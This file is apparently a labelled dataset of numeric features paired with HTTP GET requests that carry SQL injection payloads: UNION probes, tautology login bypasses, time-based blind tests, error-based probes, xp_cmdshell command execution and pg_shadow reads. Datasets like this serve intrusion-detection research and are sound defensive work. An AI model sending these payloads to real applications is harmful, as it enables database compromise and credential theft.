78,2,200,4348,29,11,9,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6-- &pass= WHERE 1=1 AND 1=0 HTTP/1.1
81,1,200,5619,42,5,14,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))--  HTTP/1.1
33,1,200,1683,9,8,6,1,1,GET ?password= OR 1=0--  HTTP/1.1
209,1,200,1984,98,5,40,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112))) HTTP/1.1
257,2,200,4099,98,6,42,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21-- &pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80)))--  HTTP/1.1
46,1,200,6720,7,17,9,1,1,GET ?phone=waitfor delay '00:00:05'-- HTTP/1.1
131,2,200,7024,38,9,17,1,1,GET ?email= ORDER BY 16-- &pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18--  HTTP/1.1
150,2,200,2400,53,4,28,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5#&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18--  HTTP/1.1
56,2,200,4017,9,18,12,2,1,GET ?name=benchmark(10000000_MD5(1))#&phone='/* HTTP/1.1
135,1,200,1739,46,4,15,1,1,GET ?code= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
135,1,200,3413,46,4,15,1,1,GET ?code= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
45,2,200,6384,7,11,17,1,1,GET ?id=sleep(5)#&id=') or '1'='1'-- HTTP/1.1
275,2,200,3865,109,16,72,2,1,GET ?username= AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)&pass=OR 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(500000000/2)))) HTTP/1.1
75,2,200,2519,18,21,15,1,1,GET ?tel= OR 3409=3409 AND ('pytW' LIKE 'pytY&name=' or 'one'='one HTTP/1.1
38,1,200,1433,7,15,6,1,1,GET ?username=admin" or 1=1-- HTTP/1.1
38,1,200,6195,7,15,6,1,1,GET ?username=admin" or 1=1-- HTTP/1.1
38,1,200,2201,7,15,6,1,1,GET ?username=admin" or 1=1-- HTTP/1.1
283,2,200,5245,153,4,28,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18#&id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
168,1,200,6268,109,4,17,1,1,GET ?mail= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
168,1,200,2229,109,4,17,1,1,GET ?mail= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
87,1,200,5137,30,4,13,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
87,1,200,5636,30,4,13,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
87,1,200,2149,30,4,13,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
103,1,200,3986,21,4,4,1,1,GET ?pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25# HTTP/1.1
67,2,200,1102,21,11,8,1,1,GET ?email='or'1=1′&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8 HTTP/1.1
140,2,200,5183,30,9,17,1,1,GET ?tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26-- &name=" or "" " HTTP/1.1
38,1,200,4867,7,13,8,1,1,GET ?mail=") or pg_sleep(5)-- HTTP/1.1
75,2,200,5962,16,22,13,1,1,GET ?account=')) or benchmark(10000000_MD5(1))#&pass= ORDER BY 21  HTTP/1.1
178,2,200,7150,57,11,21,1,1,GET ?account=-1' UNION SELECT 1_2_3-- &pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25 HTTP/1.1
27,1,200,2677,7,9,4,1,1,GET ?pass=admin" # HTTP/1.1
84,1,200,3888,46,2,14,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88))) HTTP/1.1
31,1,200,4530,7,10,6,1,1,GET ?username='or'1=1′ HTTP/1.1
144,2,200,7720,54,9,25,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6#&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12# HTTP/1.1
169,2,200,7107,46,19,22,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23&pass=admin") or ("1"="1"-- HTTP/1.1
53,1,200,6584,7,27,7,1,1,GET ?username=' group by userid having 1=1-- HTTP/1.1
144,1,200,6781,46,4,15,1,1,GET ?user= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25 HTTP/1.1
105,2,200,4200,31,14,20,1,1,GET ?phone=admin') or '1'='1&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10# HTTP/1.1
32,1,200,2074,7,9,6,2,1,GET ?id=admin' or 1=1/* HTTP/1.1
32,1,200,5832,7,9,6,2,1,GET ?id=admin' or 1=1/* HTTP/1.1
69,1,200,1170,30,4,15,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6--  HTTP/1.1
90,2,200,6690,45,8,16,1,1,GET ?code= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)-- &code= WHERE 1=1 AND 1=1# HTTP/1.1
156,2,200,4172,77,19,21,1,1,GET ?username=admin" or "1"="1"#&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
76,2,200,1660,29,15,19,1,1,GET ?email=(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--&phone= or 1=1-- HTTP/1.1
47,2,200,2030,7,15,7,1,1,GET ?name=" or 0=0 –&phone=" or "x"="x HTTP/1.1
112,2,200,1841,31,14,18,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13#&pass=' or 1=1;# HTTP/1.1
126,2,200,2976,30,15,22,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19-- &pass=' or sleep(5)=' HTTP/1.1
51,2,200,5598,14,14,9,1,1,GET ?tel= ORDER BY 30#&name=" or sleep(5)# HTTP/1.1
120,2,200,7477,24,35,17,2,1,GET ?email=admin' or '1'='1'/*&phone=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
50,2,200,4296,7,15,17,1,1,GET ?account=') or ('1'='1&pass=' or ''*' HTTP/1.1
26,1,200,6599,7,8,5,1,1,GET ?password=' # HTTP/1.1
252,2,200,3540,70,7,28,1,1,GET ?phone= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27#&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20--  HTTP/1.1
144,2,200,3328,42,16,20,1,1,GET ?email= OR 3409=3409 AND ('pytW' LIKE 'pytY&phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15--  HTTP/1.1
31,2,200,6313,7,9,4,1,1,GET ?account=" or ""&" HTTP/1.1
79,2,200,4885,7,45,10,1,1,GET ?email=admin" or "1"="1&phone=exec master..xp_cmdshell 'net users' HTTP/1.1
56,2,200,7764,7,21,12,1,1,GET ?email= or 0=0 –&phone=")) or pg_sleep(5)-- HTTP/1.1
126,2,200,2434,21,14,11,1,1,GET ?username=' or 1=1 --&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25--  HTTP/1.1
123,2,200,2120,21,6,7,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28#&id=" or ""*" HTTP/1.1
41,1,200,6678,16,7,7,1,1,GET ?phone=' AnD SLEEP(5) ANd '1 HTTP/1.1
173,2,200,4167,55,13,17,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19#&pass= RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' HTTP/1.1
39,1,200,1734,7,21,5,1,1,GET ?mail=select @@servernamee HTTP/1.1
39,1,200,1955,7,21,5,1,1,GET ?mail=select @@servernamee HTTP/1.1
94,1,200,1128,21,4,4,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22# HTTP/1.1
94,1,200,2266,21,4,4,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22# HTTP/1.1
249,2,200,4969,105,4,27,1,1,GET ?id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27 HTTP/1.1
226,2,200,3301,63,25,22,1,1,GET ?tel=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055&name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26 HTTP/1.1
23,1,200,6416,7,5,4,1,1,GET ?phone="^" HTTP/1.1
33,2,200,5474,7,9,10,1,1,GET ?name='or'1=1&tel=== HTTP/1.1
43,2,200,6159,7,11,8,2,1,GET ?id=admin" or "1"="1"/*&id="-" HTTP/1.1
169,2,200,4088,31,29,15,1,1,GET ?account=select * from pg_shadow;&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28 HTTP/1.1
34,1,200,5164,7,12,7,1,1,GET ?phone=' or sleep(5)# HTTP/1.1
209,2,200,3672,90,12,43,1,1,GET ?code=") or ("x")=("x&code= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65))) HTTP/1.1
162,2,200,3702,38,8,16,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29-- &pass= ORDER BY 19#  HTTP/1.1
68,2,200,5677,21,14,9,1,1,GET ?tel= UNION ALL SELECT 1_2_3_4_5-- &name=admin" or 1=1# HTTP/1.1
202,2,200,3797,120,7,31,1,1,GET ?tel= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3--  HTTP/1.1
39,1,200,5864,15,4,7,1,1,GET ?code= WHERE 1=1 AND 1=0-- HTTP/1.1
220,2,200,4455,98,7,42,1,1,GET ?tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80)))-- &name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8--  HTTP/1.1
50,2,200,5111,14,12,7,1,1,GET ?mail= ORDER BY 28# &pass=" or "a"="a HTTP/1.1
114,1,200,6179,58,4,21,1,1,GET ?code= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88)))# HTTP/1.1
59,2,200,6285,14,16,11,1,1,GET ?email=")) or sleep(5)="&pass= ORDER BY 31337# HTTP/1.1
180,2,200,2163,97,18,22,1,1,GET ?account= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass=admin") or ("1"="1 HTTP/1.1
140,2,200,1715,57,25,24,1,1,GET ?code=' GROUP BY columnnames having 1=1 --&code= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88)))--  HTTP/1.1
57,2,200,7145,26,8,9,1,1,GET ?mail= ORDER BY 28 &pass=ORDER BY SLEEP(5)-- HTTP/1.1
51,1,200,7869,7,25,7,1,1,GET ?mail=' group by username having 1=1-- HTTP/1.1
51,1,200,7626,7,25,7,1,1,GET ?mail=' group by username having 1=1-- HTTP/1.1
52,1,200,3786,13,8,6,1,1,GET ?password= AND 1083=1083 AND (1427=1427 HTTP/1.1
114,2,200,4340,31,26,12,1,1,GET ?code= ORDER BY 19-- &code=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
176,2,200,1092,54,4,25,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11--  HTTP/1.1
41,1,200,2837,15,8,5,1,1,GET ?username= WHERE 1=1 AND 1=1 HTTP/1.1
41,1,200,7260,15,8,5,1,1,GET ?username= WHERE 1=1 AND 1=1 HTTP/1.1
75,2,200,3322,20,18,13,1,1,GET ?username= OR 1=1-- &pass= OR 3409=3409 AND ('pytW' LIKE 'pytW HTTP/1.1
82,1,200,7739,31,8,12,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8# HTTP/1.1
84,2,200,2824,37,10,18,1,1,GET ?email=1' ORDER BY 3-- &phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3 HTTP/1.1
90,2,200,2396,37,7,15,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9&id= ORDER BY 26  HTTP/1.1
29,1,200,2337,7,7,5,1,1,GET ?email= or 0=0 # HTTP/1.1
60,2,200,6841,14,17,10,1,1,GET ?email= ORDER BY 31337-- &phone=admin" or 1=1-- HTTP/1.1
71,1,200,2733,7,47,5,1,1,GET ?user=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
71,1,200,1847,7,47,5,1,1,GET ?user=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
71,1,200,3636,7,47,5,1,1,GET ?user=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
67,2,200,6465,21,15,14,2,1,GET ?code= UNION ALL SELECT 1_2&code=admin') or ('1'='1'/* HTTP/1.1
68,1,200,2597,30,7,15,1,1,GET ?account= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
116,2,200,5244,31,20,24,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8#&name=') or ('a'='a and hi") or ("a"="a HTTP/1.1
189,2,200,4558,55,7,23,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16-- &name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16 HTTP/1.1
35,1,200,3386,7,14,7,1,1,GET ?password=') or true-- HTTP/1.1
35,1,200,6384,7,14,7,1,1,GET ?password=') or true-- HTTP/1.1
33,1,200,2159,13,7,4,1,1,GET ?account= HAVING 1=1 HTTP/1.1
80,2,200,5272,7,48,14,1,1,GET ?code=select current_setting('krb_server_keyfile');&code=' or a=a-- HTTP/1.1
42,2,200,1575,7,11,7,1,1,GET ?name=" or ""-"&tel=" or ""*" HTTP/1.1
251,2,200,3984,116,7,46,1,1,GET ?phone= UNION ALL SELECT 1_2_3_4&id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106)))--  HTTP/1.1
112,2,200,1264,7,75,11,1,1,GET ?account=select name_ tbname_ coltype from sysibm.syscolumns;&pass=' group by username having 1=1-- HTTP/1.1
32,1,200,6913,7,9,4,1,1,GET ?account=" or 0=0 – HTTP/1.1
32,1,200,4701,7,9,4,1,1,GET ?account=" or 0=0 – HTTP/1.1
171,2,200,7341,45,7,14,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12&tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23# HTTP/1.1
32,1,200,6723,7,11,5,1,1,GET ?user=admin' or 1=1 HTTP/1.1
96,2,200,1790,9,50,15,1,1,GET ?name=select current_setting('config_file');&phone=" or benchmark(10000000_MD5(1))# HTTP/1.1
49,1,200,5636,9,17,7,1,1,GET ?password=benchmark(50000000_MD5(1)) HTTP/1.1
49,1,200,5715,9,17,7,1,1,GET ?password=benchmark(50000000_MD5(1)) HTTP/1.1
67,1,200,5171,30,2,15,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6--  HTTP/1.1
81,1,200,3766,31,7,13,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7--  HTTP/1.1
81,1,200,3499,31,7,13,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7--  HTTP/1.1
146,2,200,4494,73,14,21,1,1,GET ?name= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL-- &tel=admin" or "1"="1"# HTTP/1.1
46,2,200,1534,10,14,7,1,1,GET ?username= AND 1=1&pass=" or ""=" HTTP/1.1
38,1,200,7490,7,11,8,2,1,GET login/?id=") or ("x")=("x HTTP/1.1
38,1,200,4472,7,11,8,2,1,GET login/?id=") or ("x")=("x HTTP/1.1
38,1,200,1321,7,11,8,2,1,GET login/?id=") or ("x")=("x HTTP/1.1
38,1,200,6317,7,11,8,2,1,GET login/?id=") or ("x")=("x HTTP/1.1
53,2,200,6576,14,17,9,1,1,GET ?account= ORDER BY 30 &pass=') or true-- HTTP/1.1
80,2,200,1469,30,12,21,1,1,GET ?code=") or ("x")=("x&code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2# HTTP/1.1
46,2,200,7444,16,9,8,1,1,GET ?name= OR x=x-- &tel= ORDER BY 5  HTTP/1.1
89,2,200,3437,44,4,18,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5-- &id= UNION ALL SELECT 1# HTTP/1.1
76,2,200,1529,30,12,18,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3#&code=' or a=a– HTTP/1.1
115,2,200,6858,33,18,22,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7#&name=')) or benchmark(10000000_MD5(1))# HTTP/1.1
195,2,200,5766,125,6,20,1,1,GET ?id=" #&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
132,2,200,3079,30,36,20,1,1,GET ?id=select current_setting('log_statement');&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15 HTTP/1.1
63,2,200,1372,7,23,15,1,1,GET ?tel=admin") or "1"="1"#&name=')) or pg_sleep(5)-- HTTP/1.1
50,1,200,1734,24,4,7,1,1,GET ?mail= AS INJECTX WHERE 1=1 AND 1=0-- HTTP/1.1
28,1,200,1637,9,7,5,1,1,GET ?email= OR x=y# HTTP/1.1
28,1,200,2206,9,7,5,1,1,GET ?email= OR x=y# HTTP/1.1
63,2,200,5475,17,16,12,1,1,GET ?username= AND 7300=7300 AND 'pKlZ'='pKlZ&pass=' ' HTTP/1.1
45,2,200,4624,14,8,8,1,1,GET ?id= or 0=0 --&pass= ORDER BY 4  HTTP/1.1
202,2,200,2997,101,8,42,1,1,GET ?phone=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#&id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80)))--  HTTP/1.1
33,1,200,1249,7,10,6,2,1,GET login/?id=' and 1='1 HTTP/1.1
96,2,200,1921,31,7,16,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11-- &name="*" HTTP/1.1
114,2,200,1491,53,9,18,1,1,GET ?name= ORDER BY 2 &phone= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8# HTTP/1.1
32,1,200,1220,14,4,4,1,1,GET ?pass= ORDER BY 4#  HTTP/1.1
32,1,200,7643,14,4,4,1,1,GET ?pass= ORDER BY 4#  HTTP/1.1
32,1,200,4933,7,9,4,2,1,GET login/?id= or 0=0 – HTTP/1.1
55,2,200,6334,21,4,9,1,1,GET ?id= ORDER BY 28# &id=1' GROUP BY 1_2_3--  HTTP/1.1
62,2,200,7791,28,9,7,1,1,GET ?name= UNION ALL SELECT 1_2#&phone= ORDER BY 16#  HTTP/1.1
50,2,200,7006,17,8,9,1,1,GET ?mail= AND 1=1-- &pass= ORDER BY 16#  HTTP/1.1
240,1,200,6262,105,5,45,1,1,GET ?phone= UNION ALL SELECT CHAR(113) CHAR(106) CHAR(122) CHAR(106) CHAR(113) CHAR(110) CHAR(106) CHAR(99) CHAR(73) CHAR(66) CHAR(109) CHAR(119) CHAR(81) CHAR(108) CHAR(88) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)_NULL--  HTTP/1.1
240,1,200,2760,105,5,45,1,1,GET ?phone= UNION ALL SELECT CHAR(113) CHAR(106) CHAR(122) CHAR(106) CHAR(113) CHAR(110) CHAR(106) CHAR(99) CHAR(73) CHAR(66) CHAR(109) CHAR(119) CHAR(81) CHAR(108) CHAR(88) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)_NULL--  HTTP/1.1
240,1,200,5887,105,5,45,1,1,GET ?phone= UNION ALL SELECT CHAR(113) CHAR(106) CHAR(122) CHAR(106) CHAR(113) CHAR(110) CHAR(106) CHAR(99) CHAR(73) CHAR(66) CHAR(109) CHAR(119) CHAR(81) CHAR(108) CHAR(88) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)_NULL--  HTTP/1.1
184,2,200,7721,85,8,28,1,1,GET ?mail= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88)))&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
139,1,200,6065,30,8,15,1,1,GET ?password= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29--  HTTP/1.1
56,2,200,2791,20,10,10,1,1,GET ?email= ORDER BY 12-- &phone= HAVING 1=0--  HTTP/1.1
27,1,200,2320,7,9,4,2,1,GET ?user=admin"/* HTTP/1.1
27,1,200,1979,7,9,4,2,1,GET ?user=admin"/* HTTP/1.1
53,2,200,3872,7,21,15,1,1,GET ?account=' or ''='&pass=' or 'one'='one– HTTP/1.1
200,2,200,6171,47,25,21,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25#&tel=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
44,1,200,2057,7,14,12,1,1,GET ?id="));waitfor delay '0:0:5'-- HTTP/1.1
44,1,200,3443,7,14,12,1,1,GET ?id="));waitfor delay '0:0:5'-- HTTP/1.1
